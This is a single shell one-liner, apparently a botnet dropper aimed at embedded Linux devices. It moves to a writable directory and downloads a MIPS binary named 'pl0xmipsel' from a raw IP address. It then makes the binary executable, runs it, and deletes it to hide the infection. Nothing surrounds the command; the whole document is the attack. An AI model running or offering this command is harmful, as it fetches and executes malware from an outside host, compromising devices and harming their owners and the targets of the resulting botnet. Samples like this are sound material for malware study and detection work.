cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.106/pl0xmipsel; chmod +x pl0xmipsel; ./pl0xmipsel; rm -rf pl0xmipsel
